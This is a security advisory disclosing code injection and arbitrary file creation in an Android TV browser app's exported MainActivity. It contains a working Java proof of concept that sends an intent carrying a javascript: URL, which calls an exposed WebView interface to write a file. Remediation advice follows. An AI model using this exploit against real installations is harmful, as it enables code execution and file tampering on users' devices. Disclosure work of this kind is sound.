

---

### Vulnerability Report: Code Injection (CWE-94) & Arbitrary File Creation

#### Overview:
The `com.altamirano.fabricio.tvbrowser.MainActivity` activity is exported and can be invoked by third-party applications, exposing the app to potential attacks.

#### Affected Component:
- Component: `com.altamirano.fabricio.tvbrowser.MainActivity`

#### Code Injection Details:
An attacker can invoke the `MainActivity` of the `com.altamirano.fabricio.tvbrowser` app by sending an explicit intent. When a crafted URL containing malicious JavaScript is passed to the WebView, the code is executed within the app's context.

#### Arbitrary File Creation via JavaScript Interface Exposure:

The `MainActivity`'s WebView exposes certain JavaScript interfaces to web content. This exposes the app to arbitrary file creation vulnerabilities.

**Proof of Concept (Code Injection):**



```java
    public void launchBrowser() {
        // Constructing the JavaScript code to directly invoke the exposed JavaScript interface method.
        String base64TestData = "VGhpcyBpcyBhIHRlc3QgZm9yIHRoZSB2dWxuZXJhYmlsaXR5IFBvQy4="; // Represents "This is a test for the vulnerability PoC."
        String jsCode = String.format("javascript:if(window.Android && typeof window.Android.getBase64FromBlobData === 'function'){ window.Android.getBase64FromBlobData('data:text/plain;base64,%s', 'test.txt'); }", base64TestData);

        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setComponent(new ComponentName("com.altamirano.fabricio.tvbrowser", "com.altamirano.fabricio.tvbrowser.MainActivity"));
        intent.setData(Uri.parse(jsCode));
        startActivity(intent);
}

```


![TVBrowserDemo](https://github.com/actuator/com.altamirano.fabricio.tvbrowser/assets/78701239/5835748e-cd5a-4d06-bd95-d56d0700867f)



---

#### Recommendations:
1. **Limit WebView Exposure:** Remove the exported status of activities containing a WebView or restrict them using intent filters.
2. **Validate URLs:** Ensure that URLs loaded in a WebView are validated and sanitized.
3. **Use JavaScript Safely:** Limit JavaScript access within the WebView. If required, only whitelist trusted scripts and sources.
4. **Restrict File Operations:** Ensure the exposed JavaScript interfaces don't grant unintended file permissions or access.

#### References:
- [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
- [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)

---
